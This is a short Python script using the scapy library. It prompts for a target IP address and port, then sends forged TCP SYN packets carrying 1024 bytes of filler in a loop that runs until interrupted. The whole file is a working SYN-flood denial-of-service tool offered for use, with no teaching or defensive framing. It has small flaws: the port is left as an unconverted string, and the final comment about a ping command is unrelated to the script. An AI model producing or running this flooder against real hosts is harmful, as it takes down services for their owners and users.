from scapy.all import *
from scapy.layers.inet import IP, TCP
# designate target ip
target_ip = input("Enter target IP: ")
# designate target port
target_port = input("Enter target port: ")
# create IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
# add some flooding data to the packet
raw = Raw(b"X"*1024)
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
send(p, loop=1, verbose=0)
# us following command to run script "$ ping -t "192.168.1.1""